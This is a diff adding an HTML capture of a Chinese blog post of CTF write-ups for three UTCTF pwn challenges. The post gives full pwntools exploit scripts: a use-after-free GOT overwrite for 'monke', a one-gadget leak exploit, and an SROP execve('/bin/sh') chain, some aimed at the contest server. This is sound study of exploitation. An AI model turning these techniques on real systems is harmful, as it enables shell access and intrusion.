@@ -1,0 +1,357 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。 一、MONKE复现： 1.常规IDA，checksec一下，只开了NX。漏洞点在Free模块和隐藏选项： Free模块  隐藏选项：  可以看到当free的时候，会对can_eat这个全局变">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UTCTF赛后复现">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/14/UTCTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。 一、MONKE复现： 1.常规IDA，checksec一下，只开了NX。漏洞点在Free模块和隐藏选项： Free模块  隐藏选项：  可以看到当free的时候，会对can_eat这个全局变">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png">
+<meta property="article:published_time" content="2021-08-14T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-19T06:57:35.615Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="比赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png"><title>UTCTF赛后复现 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/14/UTCTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">UTCTF赛后复现</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><p>这次比赛做了两道题之后就没怎么看了，忙其他的去了。这里主要复现一下另一道题，monke。做这道题的时候估计脑子抽风了，居然没看还有一个隐藏选项在IDA中明明白白地显示着，自己居然没发现，导致啥漏洞都找不出来。</p>
+<p>一、MONKE复现：</p>
+<p>1.常规IDA，checksec一下，只开了NX。漏洞点在Free模块和隐藏选项：</p>
+<p>Free模块</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png" alt="img"></p>
+<p>隐藏选项：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png" alt="img"></p>
+<p>可以看到当free的时候，会对can_eat这个全局变量进行判断：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">can_eat默认为1</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">if ( can_eat )</span><br><span class="line">    inventory[edit_idx] = 0LL;</span><br></pre></td></tr></table></div></figure>
+
+<p>如果为1，则将指针置零，否则就不置零。这样就会造成管理banana的inventory[idx]指针悬空，再加上选项2可以rename修改内容，直接造成UAF漏洞。同时，由于这里是通过结构体inventory来管理banana，结构体如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">00000000 inventory struc ; (sizeof=0x10, mappedto_4)</span><br><span class="line">00000000 banana dq ?</span><br><span class="line">00000008 name_size dq ?</span><br><span class="line">00000010 inventory ends</span><br></pre></td></tr></table></div></figure>
+
+<p>打印内容的时候是通过inventory[idx]-&gt;banana来打印的，所以如果我们可以把banana的指针指向got表，那么就可以打印出got表中函数的真实地址，从而泄露出libc基地址，这样通过libc基地址和UAF漏洞直接劫持free函数，构造system(“/bin/sh”)即可。</p>
+<p>▲思考如何将banana指针指向got表：漏洞点同样也在free函数，由于在malloc时会申请一个0x20大小的chunk来存放banana的地址和size，用来管理banana。但是在free的时候却没有free掉这个0x20大小的chunk。</p>
+<p>(1)先申请一个0x20大小的banana0，进入隐藏选项，然后free掉，banana0进入tcache中，但是inventory[0]并没有被置0。</p>
+<p>(2)再申请一个0x20大小的banana1，将banan0申请回来，这时管理banana1的chunk就变成了banan0，这样就可以通过inventory[0]来修改banan0从而修改管理banan1的chunk，使得原本指向banan1的指针指向free的got表。</p>
+<p>(3)之后再通过选项2，就可以打印inventory[0].banana1的内容，也就是free的got表中的真实地址。</p>
+<p>2.开始编写exp:</p>
+<p>(1)首先泄露基地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">find_banana(&quot;a&quot;, 4)</span><br><span class="line"></span><br><span class="line">#跳转至隐藏选项，将can_eat置零。</span><br><span class="line">walk(&quot;0&quot;)</span><br><span class="line"></span><br><span class="line">#吃掉香蕉，使得banana0进入tcache中，方便之后申请回来，同时inventory[0]没有置零。</span><br><span class="line">eat(0)</span><br><span class="line"></span><br><span class="line">#申请banana1，将banana0申请回来，使得管理banana1的chunk变成banana0，方便之后修改。</span><br><span class="line">find_banana(&quot;b&quot;, 8)</span><br><span class="line"></span><br><span class="line">#将*(inventory[0].banana)修改为free的got表</span><br><span class="line">rename(0, p64(elf.got[&quot;free&quot;]))</span><br><span class="line">sh.sendline(&quot;s&quot;)</span><br><span class="line">skip_menu()</span><br><span class="line"></span><br><span class="line"># 展示inventory，从inventory[0].banana对应的内存上泄露地址</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">free = u64(sh.recvline()[3:].strip().ljust(8, b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">#计算得到libc基地址：</span><br><span class="line">libc.address = free - libc.symbols[&quot;free&quot;]</span><br><span class="line">log.info(f&quot;libc base leaked @ 0x&#123;libc.address:x&#125;&quot;)</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)劫持free函数为system函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#此时inventory[1].banana的值应该是free的got表，那么此时修改</span><br><span class="line">#inventory[1].banana.content就会直接修改free的got表，从而劫持函数</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(&quot;rename&quot;)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(p64(libc.symbols[&quot;system&quot;]))</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)再申请一个内容为/bin/sh字符串的chunk，释放掉即可getshell：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">find_banana(&quot;/bin/sh&quot;, 10)</span><br><span class="line">eat(2, True)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>(4)前置函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./monke&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">sh = elf.process()</span><br><span class="line">#sh = remote(&quot;pwn.utctf.live&quot;, 9999)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def skip_menu():</span><br><span class="line">    global sh</span><br><span class="line">    sh.recvuntil(&quot;2: inventory\n&quot;)</span><br><span class="line">    return bool(sh.recvline(timeout=0.5))</span><br><span class="line"></span><br><span class="line">def walk(where=&quot;s&quot;):</span><br><span class="line">    global sh</span><br><span class="line">    sh.sendline(&quot;0&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;[n|s|e|w]&quot;, where)</span><br><span class="line">    return skip_menu()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_banana(name, length):</span><br><span class="line">    global sh</span><br><span class="line">    while not walk():</span><br><span class="line">        pass</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;How long would you like the name to be:&quot;, str(length))</span><br><span class="line">    sh.sendlineafter(&quot;What would you like to name it:&quot;, name)</span><br><span class="line">    skip_menu()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def eat(idx, end = False):</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    while bool(sh.recvline(timeout=0.5)):</span><br><span class="line">        pass</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvline()</span><br><span class="line">    sh.sendline(&quot;eat&quot;)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    if not end:</span><br><span class="line">        skip_menu()</span><br><span class="line"></span><br><span class="line">def rename(idx, name):</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    while bool(sh.recvline(timeout=0.5)):</span><br><span class="line">        pass</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvline()</span><br><span class="line">    sh.sendline(&quot;rename&quot;)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    skip_menu()</span><br></pre></td></tr></table></div></figure>
+
+<p>二、functionalprogramming：</p>
+<p>1.常规IDA，checksec分析，RELRO没开。程序本身很简单，输入function，parameter和element可以构造一个函数，然后调用。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457785.png" alt="img"></p>
+<p>2.然后程序运行过程中会泄露出libc地址和，直接从网站<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://libc.blukat.me/%E6%9D%A5%E6%89%BE%E7%89%88%E6%9C%AC%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5%EF%BC%8C%E5%88%A9%E7%94%A8%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84abs%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E7%9F%A5libc%E7%89%88%E6%9C%AC%E4%B8%BAlibc6_2.23-0ubuntu11.2_amd64%E3%80%82" >https://libc.blukat.me/来找版本，或者使用其他工具也可以，利用泄露出来的abs函数地址，即可得知libc版本为libc6_2.23-0ubuntu11.2_amd64。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>3.然后根据程序，即可构造system(“/bin/sh”)，或者利用onegadget也可以，这里直接贴exp吧。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">io = remote(&#x27;pwn.utctf.live&#x27;,5433)</span><br><span class="line">#io = process(&#x27;./functionalprogramming&#x27;)</span><br><span class="line">onegadget = 0xf0364</span><br><span class="line"></span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line">io.recvuntil(&quot;Abs: &quot;)</span><br><span class="line">libc_abs = int(io.recv()[2:14],16)</span><br><span class="line">libc_base = libc_abs-0x3a640</span><br><span class="line">log.info(&#x27;libc_abs:%x&#x27;%libc_abs)</span><br><span class="line">log.info(&#x27;libc_base:%x&#x27;%libc_base)</span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">#io.sendline(&#x27;1&#x27;)</span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += hex(libc_base+onegadget)</span><br><span class="line">payload = payload.replace(&#x27;0x&#x27;,&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>三、Smol复现：</p>
+<p>1.没啥好分析的，栈溢出漏洞，什么保护都没开，存在BSS段，常规SROP，利用栈劫持到BSS段，懂的都懂。</p>
+<p>2.直接贴exp:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.update(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">io = remote(&quot;pwn.utctf.live&quot;,9998)</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += p64(0x402000+0x10)</span><br><span class="line">payload += p64(0x402000+0x10) #addr 0x402008</span><br><span class="line">payload += p64(0x401015) #rsp = 0x402020</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">frame_execve = SigreturnFrame() #设置execve的SROP帧，注意计算/bin/sh\x00所在地址</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = 0x402008</span><br><span class="line">frame_execve.rip = 0x40103D #syscall_addr</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;        #0x402008</span><br><span class="line">payload2 += p64(0x402000+0x10)   #0x402010</span><br><span class="line">payload2 += p64(0x401015)        #0x402018</span><br><span class="line">payload2 += p64(0x402000+0x30)   #0x402020</span><br><span class="line">payload2 += &quot;A&quot;*0x10             #0x402028</span><br><span class="line">payload2 += p64(0x40103D)</span><br><span class="line">payload2 += str(frame_execve)    #0x402038</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">#buf = 0x402008</span><br><span class="line">#rsp = 0x402020</span><br><span class="line">#rbp = 0x402010 -&gt;0x402010</span><br><span class="line"></span><br><span class="line">payload3 = payload2[0:8]</span><br><span class="line">payload3 += &quot;\x30\x20\x40\x00\x00\x00\x00&quot;</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>但是这里调试了好一段时间，需要再仔细分析一点，下回争取早点解决类似的题目。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2021/08/14/UTCTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/">http://pig-007.github.io/2021/08/14/UTCTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/%E6%AF%94%E8%B5%9B/">比赛</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/08/14/Security%20Fest%20CTF%202016-tvstation/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Security Fest CTF 2016-tvstation</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/08/14/TJCTF%202016-oneshot/"><span class="paginator-prev__text">TJCTF 2016-oneshot</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
